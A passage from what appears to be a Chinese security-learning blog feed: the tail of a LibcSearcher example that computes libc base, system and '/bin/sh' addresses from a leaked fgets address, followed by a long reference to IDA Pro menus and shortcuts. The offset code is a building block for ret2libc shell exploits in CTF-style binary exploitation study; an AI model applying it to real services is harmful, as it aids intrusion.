<h1 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span></span><br><span class="line">gets_real_addr = <span class="number">0X7ff39014bd90</span>		<span class="comment"># gets 真实地址</span></span><br><span class="line">obj = LibcSearcher(<span class="string">"fgets"</span>, gets_real_addr)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> obj.dump(<span class="string">"system"</span>)        <span class="comment"># system 偏移</span></span><br><span class="line"><span class="built_in">print</span> obj.dump(<span class="string">"str_bin_sh"</span>)    <span class="comment"># /bin/sh 偏移</span></span><br><span class="line"><span class="built_in">print</span> obj.dump(<span class="string">"__libc_start_main_ret"</span>)   </span><br><span class="line"></span><br><span class="line">libcbase = gets_real_addr – obj.dump(<span class="string">"fgets"</span>)</span><br><span class="line">system_addr = libcbase + obj.dump(<span class="string">"system"</span>)            	<span class="comment"># system 真实地址</span></span><br><span class="line">bin_sh_addr = libcbase + obj.dump(<span class="string">"str_bin_sh"</span>)       	<span class="comment"># /bin/sh 真实地址</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">"system_addr"</span>,system_addr</span><br><span class="line"><span class="built_in">print</span> <span class="string">"bin_sh_addr"</span>,bin_sh_addr</span><br></pre></td></tr></table></figure>

<ul>
<li>如果遇到返回多个libc版本库的情况，可以通过<code>add_condition(leaked_func, leaked_address)</code>来添加限制条件，也可以手工选择其中一个libc版本。</li>
</ul>
]]></content>
      <categories>
        <category>二进制学习</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>LibcSearcher</tag>
      </tags>
  </entry>
  <entry>
    <title>IDA基础功能总结</title>
    <url>/IDA%E5%9F%BA%E7%A1%80%E5%8A%9F%E8%83%BD%E6%80%BB%E7%BB%93.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>IDA 是一种交互式、可编程的反汇编工具；</p>
<p>支持数十种常见处理器平台的指令集，包括 Intel x86，x64，MIPS，PowerPC，ARM， Z80，68000，c8051等；</p>
<p>IDA支持的文件类型也非常丰富，包括常 见PE格式和Windows，DOS，UNIX，Mac， Java，.NET等平台的文件格式；</p>
<p>漏洞分析时，通常先用IDA先对可执行文件进行静态分析，下面将介绍IDA V7.0用于静态分析的基础功能；<span id="more"></span></p>
<h1 id="顶部菜单栏"><a href="#顶部菜单栏" class="headerlink" title="顶部菜单栏"></a>顶部菜单栏</h1><h2 id="File"><a href="#File" class="headerlink" title="File"></a>File</h2><p>功能：</p>
<ul>
<li><p>  <code>New Instance</code>：创建新实例</p>
</li>
<li><p>  <code>Open</code>：打开文件</p>
</li>
<li><p><code>Load file</code>：加载文件</p>
<p>  可以加载文件类型有：重新加载输入文件、附加二进制文件、IDS/IDT、PDB、DBG、TDS、FLIRT结构文件、解析C头文件；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210124133434.png" style="zoom:25%;"></li>
<li><p><code>Produce file</code>：创建文件</p>
<p>  可以创建的文件的类型有：MAP、ASM、INC、LST、EXE、DIF、C、HTML、利用函数调用创建GDL、利用流程图创建GDL、C头文件、将数据库转储到IDC文件、将typeinfo转储到IDC文件中；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210124132726.png" style="zoom:25%;"></li>
<li><p>  <code>Script file</code>：加载用户自定义的IDC或IDA python脚本，实现用户定制功能，快捷键：<code>opt+F7</code>；</p>
</li>
<li><p>  <code>Script command</code>：输入并执行以内置IDC语言或任何其他注册的extlang编写的脚本，快捷键：<code>shift+F2</code>；</p>
</li>
<li><p>  <code>Save</code>：保存，快捷键：<code>ctrl+W</code>；</p>
</li>
<li><p>  <code>Save as</code>：另存为；</p>
</li>
<li><p>  <code>Take database snapshot</code>：拍摄数据库快照，保存IDA Pro当前工作信息，快捷键：<code>ctrl+shift+W</code>；</p>
</li>
<li><p>  <code>cloes</code>：关闭项目；</p>
</li>
<li><p>  <code>Quick start</code>：快速开始新的项目；</p>
</li>
</ul>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210124131522.png" style="zoom:25%;"><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210124132102.png"></p>
<h2 id="Edit"><a href="#Edit" class="headerlink" title="Edit"></a>Edit</h2><p>功能：</p>
<ul>
<li><p>  <code>Copy</code>：复制，快捷键：<code>cmd+C</code>；</p>
</li>
<li><p>  <code>Begin selection</code>：从光标处开始选择，快捷键：<code>opt+L</code>；</p>
</li>
<li><p>  <code>select all</code>：选择全部；</p>
</li>
<li><p>  <code>Select identifier</code>：选择光标所在的标识符；</p>
</li>
<li><p>  <code>Export data</code>：将二进制数据导出为不同的格式数据，快捷键：<code>shift+E</code>；</p>
</li>
<li><p>  <code>Code</code>：转换为code，快捷键：<code>C</code>；</p>
</li>
<li><p>  <code>Data</code>：转换为data，快捷键：<code>D</code>；</p>
</li>
<li><p>  <code>Struct var</code>：转换为结构体，快捷键：<code>opt+Q</code>；</p>
</li>
<li><p><code>Strings</code>：转换为字符串，快捷键：<code>A</code>，同时也可转换不同类型的字符串如C、DOS、Pascal、Wide pascal、Delphi、Unicode、Unicode pascal、Unicode wide pascal；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210124141028.png" style="zoom:25%;"></li>
<li><p>  <code>Array</code>：转换为数组，快捷键：<code>shift+Fn+*</code>；</p>
</li>
<li><p>  <code>Undefine</code>：取消当前定义，主要用于函数，快捷键：<code>U</code>；</p>
</li>
<li><p>  <code>Rename</code>：重命名，快捷键：<code>N</code>；</p>
</li>
<li><p><code>Operand type</code>：操作数类型</p>
<ul>
<li><p><code>Offset</code>：偏移</p>
<ul>
<li>  <code>Offset(data segment)</code>：将当前指令/数据的立即数转换为当前数据段（DS）的偏移量，如果当前的DS值未知（或等于0xFFFF），则IDA会发出哔声警告，因此必须为当前字节定义DS寄存器值，快捷键：<code>O</code>；</li>
<li>  <code>Offset(surrent segment)</code>：将当前指令/数据的立即数转换为当前段（CS）的偏移量，快捷键：<code>ctrl+O</code>；</li>
<li>  <code>Offset by(any segment)</code>：将当前指令/数据的立即数转换为任何段的偏移量，IDA会要求选择偏移量的基础段，快捷键：<code>opt+R</code>；</li>
<li>  <code>Offset(user-defined)</code>：将当前指令/数据的立即数操作数转换为复数偏移量表达式，快捷键：<code>ctrl+R</code>；</li>
<li>  <code>Offset(struct)</code>：将范围选择中的所有指令立即数转换为通过结构及其可能的子联合的偏移路径，快捷键：<code>T</code></li>
</ul>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210124173639.png" style="zoom:25%;"></li>
<li><p><code>Number</code>：数字</p>
<ul>
<li><p>  <code>Number(default)</code>：将当前指令/数据的立即操作数类型转换为数字，快捷键：<code>shift+Fn+#</code>；</p>
</li>
<li><p>  <code>Hexadecimal</code>：将当前指令/数据的立即操作数类型转换为十六进制数：快捷键：<code>Q</code>；</p>
</li>
<li><p>  <code>Decimal</code>：将当前指令/数据的立即操作数类型转换为十进制数：快捷键：<code>H</code>；</p>
</li>
<li><p>  <code>Octal</code>：将当前指令/数据的立即操作数类型转换为八进制数；</p>
</li>
<li><p>  <code>Binary</code>：将当前指令/数据的立即操作数类型转换为二进制数：快捷键：<code>B</code>；</p>
</li>
<li><p>  <code>Floating point</code>：将当前操作数类型转换为浮点数；</p>
</li>
<li><p><code>Toggle leading zeroes</code>：显示或隐藏当前操作数的前导零；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210124175909.png" style="zoom:25%;"></li>
</ul>
</li>
<li><p>  <code>Character</code>：将当前指令/数据的立即操作数类型转换为字符，快捷键：<code>R</code>；</p>
</li>
<li><p>  <code>Segment</code>：将当前指令/数据的立即操作数类型转换为段基，快捷键：<code>S</code>；</p>
</li>
<li><p>  <code>Enmu member</code>：将当前指令/数据的立即操作数类型转换为枚举成员，快捷键：<code>M</code>；</p>
</li>
<li><p>  <code>Stack variable</code>：将当前指令的立即操作数类型转换为堆栈变量的偏移量，即堆栈中的局部变量或函数参数，快捷键：<code>K</code>；</p>
</li>
<li><p>  <code>Change sign</code>：更改当前操作数的符号，并非所有操作数都可以更改其符号；</p>
</li>
<li><p>  <code>Bitwise negate</code>：将当前操作数按位取反，并非所有类型的操作数都可以取反，不能同时取反和更改操作数的符号，快捷键：<code>shift+Fn+~</code>；</p>
</li>
<li><p>  <code>Manual</code>：自定义操作数，快捷键：<code>opt+F1</code>；</p>
</li>
<li><p>  <code>Set operand type</code>：设置光标下的操作数的类型；</p>
</li>
</ul>
</li>
<li><p><code>Comments</code>：注释</p>
<ul>
<li><p>  <code>Enter comment</code>：创建常规注释，快捷键：<code>shift+Fn+:</code>；</p>
</li>
<li><p>  <code>Enter repeatable comment</code>：创建交叉注释，快捷键：<code>ctrl+;</code>；</p>
</li>
<li><p>  <code>Enter anterior lines</code>：创建行前注释；</p>
</li>
<li><p><code>Enter anterior lines</code>：创建行后注释；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210124183616.png" style="zoom:25%;"></li>
</ul>
</li>
<li><p><code>Segment</code>：段操作</p>
<ul>
<li><p>  <code>Create segment</code>：创建新段；</p>
</li>
<li><p>  <code>Edit segment</code>：更改除段基础以外的所有段属性，快捷键：<code>opt+S</code>；</p>
</li>
<li><p>  <code>Delete segment</code>：删除段；</p>
</li>
<li><p>  <code>Move current segment</code>：将段移动到另一个地址；</p>
</li>
<li><p>  <code>Rebase program</code>：将整个程序按存储器中指定的字节数移动；</p>
</li>
<li><p>  <code>Change segment translation</code>：更改段翻译，段翻译是在解析对当前段指令的引用时要使用的其他段序列，只有代码引用受段翻译的影响，通过修改数据段寄存器，可以将数据引用重定向到所需的地址；</p>
</li>
<li><p>  <code>Change segment register value</code>：创建或更改段寄存器值，快捷键：<code>opt+G</code>；</p>
</li>
<li><p><code>Set default segment register value</code>：设置默认段寄存器值；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210124185007.png" style="zoom:25%;"></li>
</ul>
</li>
<li><p><code>Structs</code>：结构体操作</p>
<ul>
<li><p>  <code>Add struct type</code>：定义新的结构体或联合；</p>
</li>
<li><p>  <code>Copy struct type</code>：复制当前结构体；</p>
</li>
<li><p>  <code>Edit struct type</code>：编辑结构体，包括将当前结构体定义移动到结构体窗口中的另一个位置、更改结构对齐方式；</p>
</li>
<li><p>  <code>Delete struct type</code>：删除当前结构体，快捷键：<code>Fn+删除按钮</code>；</p>
</li>
<li><p>  <code>Expand struct type</code>：通过插入未定义字节来扩展当前结构体；</p>
</li>
<li><p>  <code>Shrink struct type</code>：删除光标位置处的未定义字节来缩小当前结构体；</p>
</li>
<li><p>  <code>Struct var</code>：声明结构体，快捷键：<code>opt+Q</code>；</p>
</li>
<li><p>  <code>Force zero offset filed</code>：强制零偏移，即使结构体成员的偏移量等于零，也会强制IDA显示完整的结构体成员名称，快捷键：<code>ctrl+Z</code>；</p>
</li>
<li><p>  <code>Select union member</code>：选取联合成员，从当前光标位置显示对联合的引用，快捷键：<code>opt+Y</code>；</p>
</li>
<li><p>  <code>Create struct from selection</code>：根据已经定义的结构体定义新的结构体；</p>
</li>
<li><p><code>Copy field into pointers</code>：扫描当前的结构体，并重置偏移量表达式所指向的位置；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210124191248.png" style="zoom:25%;">

  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210124192737.png" style="zoom:25%;"></li>
</ul>
</li>
<li><p><code>Functions</code>：函数操作</p>
<ul>
<li><p>  <code>Create function</code>：创建函数；</p>
</li>
<li><p>  <code>Edit function</code>：编辑函数，快捷键：<code>opt+P</code>；</p>
</li>
<li><p>  <code>Append function tail</code>：将程序的任意范围附加到函数定义中；</p>
</li>
<li><p>  <code>Remove function tail</code>：从函数定义中删除光标处的函数尾部；</p>
</li>
<li><p>  <code>Delete function</code>：删除函数；</p>
</li>
<li><p>  <code>Set function end</code>：更改当前或先前的函数范围，将其结尾设置在光标处，快捷键：<code>E</code>；</p>
</li>
<li><p>  <code>Stack variables</code>：打开当前函数的堆栈变量窗口，快捷键：<code>ctrl+K</code>；</p>
</li>
<li><p>  <code>Change stack pointer</code>：指定当前指令如何修改堆栈指针（SP），快捷键：<code>opt+K</code>；</p>
</li>
<li><p>  <code>Rename register</code>：将常规寄存器重命名为一些有意义的名称，快捷键：<code>V</code>；</p>
</li>
<li><p><code>Set type</code>：指定当前函数的命名，快捷键：<code>Y</code>；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210124194952.png" style="zoom:25%;"></li>
</ul>
</li>
<li><p><code>Patch program</code>：修补程序</p>
<ul>
<li><p>  <code>Change byte</code>：通过修改字节来修改程序；</p>
</li>
<li><p>  <code>Change word</code>：通过修改字来修改程序；</p>
</li>
<li><p>  <code>Assemble</code>：将指令汇编；</p>
</li>
<li><p>  <code>Pached bytes</code>：查看修改的字节，快捷键：<code>ctrl+opt+P</code>；</p>
</li>
<li><p><code>Apply patches to input file</code>：将之前修补的字节应用回输入文件；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210124231805.png" style="zoom:25%;"></li>
</ul>
</li>
<li><p><code>Other</code></p>
<ul>
<li><p>  <code>Create alignment directive</code>：创建对齐指令，对齐指令将替换链接器插入的许多无用字节，用于将代码和数据对齐到段落边界或等于2的幂的任何其他地址，快捷键：<code>L</code>；</p>
</li>
<li><p>  <code>Manual instruction</code>：指定程序中指令或数据的表示形式，快捷键：<code>opt+F2</code>；</p>
</li>
<li><p>  <code>Color instruction</code>：指定当前指令或数据项的背景颜色；</p>
</li>
<li><p><code>Toggle border</code>：隐藏/显示指令和数据之间的边界；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210124224641.png" style="zoom:25%;"></li>
</ul>
</li>
<li><p>  <code>Plugins</code>：插件模块是用C++编写的模块，可为IDA提供其他功能；</p>
</li>
<li><p>  <code>Emoji &amp; Symbols</code>：字符检视器，用于字符和代码之间的转换，快捷键：<code>ctrl+cmd+Space</code>；</p>
</li>
</ul>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210124134855.png" style="zoom:25%;">

<h2 id="Jump"><a href="#Jump" class="headerlink" title="Jump"></a>Jump</h2><p>功能：</p>
<ul>
<li><p>  <code>Jump to operand</code>：即<code>name register</code>，重命名寄存器；</p>
</li>
<li><p>  <code>Jump in a new window</code>：打开一个与现在窗口类型相同的新窗口；</p>
</li>
<li><p>  <code>Jump to previous position</code>：跳转到前一个位置；</p>
</li>
<li><p>  <code>Jump to next position</code>：跳转到后一个位置；</p>
</li>
<li><p>  <code>Empty navigation stack</code>：清除跳转堆栈；</p>
</li>
<li><p>  <code>Jump to pseudocode</code>：在反汇编视图和伪代码视图之间切换，快捷键：<code>Tab</code>；</p>
</li>
<li><p>  <code>Jump to address</code>：跳转到程序中指定的地址，快捷键：<code>G</code>；</p>
</li>
<li><p>  <code>Jump by name</code>：跳转到指定命名位置处，快捷键：<code>ctrl+L</code>；</p>
</li>
<li><p>  <code>Jump to function</code>：跳转到选定的函数处，快捷键：<code>ctrl+P</code>；</p>
</li>
<li><p>  <code>Jump to segment</code>：跳转到指定段的段头，快捷键：<code>ctrl+S</code>；</p>
</li>
<li><p>  <code>Jump to segment register</code>：跳转到指定寄存器，快捷键：<code>ctrl+G</code>；</p>
</li>
<li><p>  <code>Jump to problem</code>：跳转到有问题的位置，快捷键：<code>ctrl+Q</code>；</p>
</li>
<li><p>  <code>List cross references to</code>：列出光标位置到达的交叉引用，快捷键：<code>ctrl+X</code>；</p>
</li>
<li><p>  <code>List cross references from</code>：列出到光标位置的交叉引用，快捷键：<code>ctrl+J</code>；</p>
</li>
<li><p>  <code>Jump to xref to operand</code>：显示当前操作数的交叉引用列表，方便跳转，快捷键：<code>X</code>；</p>
</li>
<li><p>  <code>Jump to entry point</code>：显示入口点列表，方便跳到所选入口点，快捷键：<code>ctrl+E</code>；</p>
</li>
<li><p>  <code>Jump to file offset</code>：指定文件偏移相对应的地址并跳转；</p>
</li>
<li><p>  <code>Marked position</code>，添加标签，快捷键：<code>opt+M</code>；</p>
</li>
<li><p>  <code>Jump to marked position</code>：选择一个标签并跳转，快捷键：<code>ctrl+M</code>；</p>
</li>
<li><p><code>Clear mark</code>：删除标记位置；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210125092623.png" style="zoom:25%;"></li>
</ul>
<h2 id="Search"><a href="#Search" class="headerlink" title="Search"></a>Search</h2><p>功能：</p>
<ul>
<li><p>  <code>next code</code>：查找下一条指令，快捷键：<code>opt+C</code>；</p>
</li>
<li><p>  <code>next data</code>：查找下一条数据，快捷键：<code>ctrl+D</code>；</p>
</li>
<li><p>  <code>next explored</code>：查找下一个定义的字节序列，快捷键：<code>ctrl+A</code>；</p>
</li>
<li><p>  <code>next unexplored</code>：查找下一个未定义字节序列，快捷键：<code>ctrl+U</code>；</p>
</li>
<li><p>  <code>immediate value</code>：搜索立即数，快捷键：<code>opt+I</code>；</p>
</li>
<li><p>  <code>next immediate value</code>：查找下一个立即数，快捷键：<code>ctrl+I</code>；</p>
</li>
<li><p>  <code>text</code>：搜索字符串，快捷键：<code>opt+T</code>；</p>
</li>
<li><p>  <code>next text</code>：查找下一个字符串，快捷键：<code>ctrl+T</code>；</p>
</li>
<li><p>  <code>sequence of bytes</code>：搜索字节序列，快捷键：<code>opt+B</code>；</p>
</li>
<li><p>  <code>next sequence of bytes</code>：查找下一个字节序列，快捷键：<code>ctrl+B</code>；</p>
</li>
<li><p>  <code>not fuction</code>：搜索不属于任何函数的第一个字节；</p>
</li>
<li><p>  <code>next void</code>：搜索下一个无效的位置，快捷键：<code>ctrl+V</code>；</p>
</li>
<li><p>  <code>error operand</code>：搜索错误操作数，快捷键：<code>ctrl+F</code>；</p>
</li>
<li><p>  <code>all void operands</code>：搜索所有的无效操作数，并显示它们的列表；</p>
</li>
<li><p>  <code>all error operands</code>：搜索包含任何出现错误的操作数，并显示它们的列表；</p>
</li>
<li><p><code>search direction</code>：切换搜索方向；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210125174031.png" style="zoom:25%;"></li>
</ul>
<h2 id="View"><a href="#View" class="headerlink" title="View"></a>View</h2><p>功能：</p>
<ul>
<li><p><code>Open subviews</code>：打开子窗口；</p>
<ul>
<li><p>  <code>Quick view</code>：查看窗口列表，快捷键：<code>ctrl+1</code>；</p>
</li>
<li><p>  <code>Functions</code>：打开函数窗口；</p>
</li>
<li><p>  <code>Disassembly</code>：打开反汇编窗口；</p>
</li>
<li><p>  <code>Hex dump</code>：打开十六进制窗口；</p>
</li>
<li><p>  <code>Structures</code>：打开结构体窗口，快捷键：<code>shift+F9</code>；</p>
</li>
<li><p>  <code>Enumerations</code>：打开枚举窗口,快捷键：<code>shift+F10</code>；</p>
</li>
<li><p>  <code>Export</code>：打开导出窗口；</p>
</li>
<li><p>  <code>Import</code>：打开导入窗口；</p>
</li>
<li><p>  <code>Proximity browser</code>：打开函数级别的窗体结构信息，查看邻近函数；</p>
</li>
<li><p>  <code>Generate pseudocode</code>：生成反汇编窗口中的函数对应的伪代码，快捷键：<code>F5</code>；</p>
</li>
<li><p>  <code>Names</code>：打开名称窗口,显示函数和参数的命名列表，快捷键：<code>shift+F4</code>；</p>
</li>
<li><p>  <code>Strings</code>：打开字符串窗口，显示出现的字符串列表，快捷键：<code>shift+F12</code>；</p>
</li>
<li><p>  <code>Segments</code>：打开段窗口，显示所有段列表，快捷键：<code>shift+F7</code>；</p>
</li>
<li><p>  <code>Segment. registers</code>：打开寄存器窗口，显示所有段的寄存器信息，快捷键：<code>shift+F8</code>；</p>
</li>
<li><p>  <code>Selectors</code>：打开选择器窗口；</p>
</li>
<li><p>  <code>Signatures</code>：打开签名窗口，包括签名文件、签名状态、签名函数、签名说明，快捷键：<code>shift+F5</code>；</p>
</li>
<li><p>  <code>Type libraries</code>：打开类库窗口，用于加载/卸载标准类库，快捷键：<code>shift+F11</code>；</p>
</li>
<li><p>  <code>Local Types</code>：打开本地类库窗口，用于修改/删除现有类库，添加新类库；</p>
</li>
<li><p>  <code>Cross references</code>：打开交叉引用窗口，显示对当前位置的所有引用；</p>
</li>
<li><p>  <code>Function calls</code>：打开函数调用窗口，显示调用当前函数的所有函数；</p>
</li>
<li><p>  <code>Notepad</code>：打开记事本窗口，获取有关当前数据库的常规注释；</p>
</li>
<li><p>  <code>Problems</code>：打开问题窗口，查看在拆卸程序期间遇到的所有问题；</p>
</li>
<li><p><code>Patched bytes</code>：打开修改字节窗口，显示修改的字节列表，快捷键：<code>ctrl+opt+P</code>；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126103158.png" style="zoom:25%;"></li>
</ul>
</li>
<li><p><code>Graphs</code>：绘制各种图形；</p>
<ul>
<li><p>  <code>Flow chat</code>：绘制当前函数的流程图，彩色箭头表示条件跳转指令的结果，快捷键：<code>F12</code>；</p>
</li>
<li><p>  <code>Print flow chat labels</code>：函数流程图中显示标签；</p>
</li>
<li><p>  <code>Function calls</code>：绘制程序中所有的函数调用流程图，快捷键：<code>ctrl+F12</code>；</p>
</li>
<li><p>  <code>Xrefs to</code>：绘制 <strong>到</strong> 程序的当前地址/选定地址范围的参照图；</p>
</li>
<li><p>  <code>Xrefs from</code>：绘制 <strong>来自</strong> 程序的当前地址/选定地址范围的参照图；</p>
</li>
<li><p><code>User xrefs chart</code>：绘制用户自定义的外部参照图，该图 <strong>来自/至</strong> 程序的当前地址/选定地址范围；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126111657.png" style="zoom:25%;"></li>
</ul>
</li>
<li><p><code>Toolbars</code>：工具栏</p>
<ul>
<li><p><code>Basic mode</code>：切换为基本UI模式;</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126135153.png" style="zoom:25%;"></li>
<li><p><code>Advanced mode</code>：切换为高级UI模式；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126135053.png" style="zoom:25%;"></li>
<li><p><code>Navigator</code>：用于查看被加载文件地址空间的线性视图，不同位置代表功能如下，可根据需要快速跳转到相关代码处；</p>
<ul>
<li>  <code>Library function</code>：库函数</li>
<li>  <code>Regular function</code>：规则函数</li>
<li>  <code>Instruction</code>：指令</li>
<li>  <code>Data</code>：数据</li>
<li>  <code>Unexplored</code>：未查询区域</li>
<li>  <code>External symbol</code>：外部符号</li>
</ul>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210123220406.png" style="zoom:25%;"></li>
<li><p><code>Address details</code>：显示地址详情；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126141717.png" style="zoom:25%;"></li>
<li><p><code>File</code>：打开和保存文件；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126141927.png" style="zoom:40%;"></li>
<li><p><code>Jump</code>：跳转命令；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126142013.png" style="zoom:40%;"></li>
<li><p><code>search</code>：搜索；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126142206.png" style="zoom:40%;"></li>
<li><p><code>Hide/Unhide</code>：切换隐藏、删除；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126142343.png" style="zoom:40%;"></li>
<li><p><code>Analysis</code>：分析，打开问题窗口；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126142428.png" style="zoom:40%;"></li>
<li><p><code>Views</code>：打开反汇编窗口、十六进制窗口、Debug窗口；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126142624.png" style="zoom:40%;"></li>
<li><p><code>Graph view</code>：切换图形视图/文本视图，切换到函数级别的窗体结构信息，设置图形大小、颜色及其它信息，打印图形；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126142833.png" style="zoom:40%;"></li>
<li><p><code>Lists</code>：显示导入、导出、名称、函数、字符串窗口；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126143221.png" style="zoom:40%;"></li>
<li><p><code>Signatures/Types</code>：显示签名窗口、类窗口；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126143521.png" style="zoom:40%;"></li>
<li><p><code>Structures/Enumerations</code>：显示字符串窗口、枚举窗口；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126143855.png" style="zoom:40%;"></li>
<li><p><code>Cross references</code>：显示交叉引用窗口、函数调用窗口；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126144032.png" style="zoom:40%;"></li>
<li><p><code>Segments</code>：显示段窗口、段寄存器窗口、选择器窗口；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126144118.png" style="zoom:40%;"></li>
<li><p><code>Edit</code>：转换为指令，转换为数据，声明结构体变量，转换为字符串，转换为数组，重命名当前位置，转换为未定义类型；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126144231.png" style="zoom:40%;"></li>
<li><p><code>Operand type</code>：数据段操作数偏移，操作数转换为数字，操作数转换为字符串，操作数转换为段基，操作数转换为符号常量，操作数转换为堆栈变量的偏移量，更改当前操作数的符号，对当前操作数执行位求反，手动输入当前操作数；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126145009.png" style="zoom:40%;"></li>
<li><p><code>Utilities</code>：打开计算器，打开记事本对数据库做注释，执行脚本命令，执行脚本文件；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126150035.png" style="zoom:40%;"></li>
<li><p><code>Functions</code>：创建新函数或编辑函数属性，打开当前函数的堆栈变量窗口，指定当前函数的命名；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126150401.png" style="zoom:40%;"></li>
<li><p><code>Enumerations</code>：定义新的枚举类型，编辑选中的枚举类型，删除选中的枚举类型，为枚举类型添加符号常量，编辑符号常量，删除符号常量；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126151104.png" style="zoom:40%;"></li>
<li><p><code>Structures</code>：声明新的结构体/枚举类型，复制选中的结构体/枚举类型，编辑结构体类型，删除结构体/枚举类型，向结构体中插入未定义的字符序列，从结构体中删除未定义的字符串；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126151504.png" style="zoom:40%;"></li>
<li><p><code>Comments</code>：创建常规注释，创建交互注释，创建行前注释，创建行后注释；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126151810.png" style="zoom:40%;"></li>
<li><p><code>Graphs</code>：绘制当前函数流程图，绘制函数调用流程图，绘制<strong>到</strong>程序的当前地址/选定地址范围的参照图，绘制<strong>来自</strong>程序的当前地址/选定地址范围的参照图，绘制用户自定义的外部参照图、该图<strong>来自/至</strong>程序的当前地址/选定地址范围；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126164648.png" style="zoom:40%;">

  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126113700.png" style="zoom:25%;"></li>
</ul>
</li>
<li><p><code>Calculator</code>：简单的计算器，输入常量C样式的表达式，语法与IDC表达式的语法相同，结果以十六进制、十进制、八进制、二进制和字符，快捷键：<code>shift+Fn+?</code>；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126114405.png" style="zoom:25%;"></li>
<li><p>  <code>Full screen</code>：切换独立窗口显示，快捷键：<code>shift+cmd+F</code>；</p>
</li>
<li><p>  <code>Graph Overview</code>：查看概览图；</p>
</li>
<li><p>  <code>Recent scripts</code>：查看添加的脚本，快捷键：<code>opt+F9</code>；</p>
</li>
<li><p>  <code>Database snapshot manager</code>：显示数据库快照管理器，可以还原、重命名或删除快照；</p>
</li>
<li><p>  <code>Print segment register</code>：显示段寄存器；</p>
</li>
<li><p>  <code>Print internal flags</code>：显示内部标志位；</p>
</li>
<li><p>  <code>Hide</code>：隐藏反汇编代码，可以是函数、段、自定义隐藏范围，快捷键：<code>ctrl + -</code>；</p>
</li>
<li><p>  <code>Unhide</code>：显示隐藏的反汇编代码，快捷键：<code>ctrl + +</code>；</p>
</li>
<li><p>  <code>Hide all</code>：隐藏所有可隐藏的反汇编代码；</p>
</li>
<li><p>  <code>Unhide all</code>：显示所有隐藏的反汇编代码；</p>
</li>
<li><p>  <code>Delete hidden range</code>：删除隐藏的自定义反汇编范围；</p>
</li>
<li><p>  <code>Setup hidden items</code>：您切换隐藏内容的显示；</p>
</li>
<li><p><code>Enter Full Screen</code>：进入全屏；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210126102730.png" style="zoom:25%;"></li>
</ul>
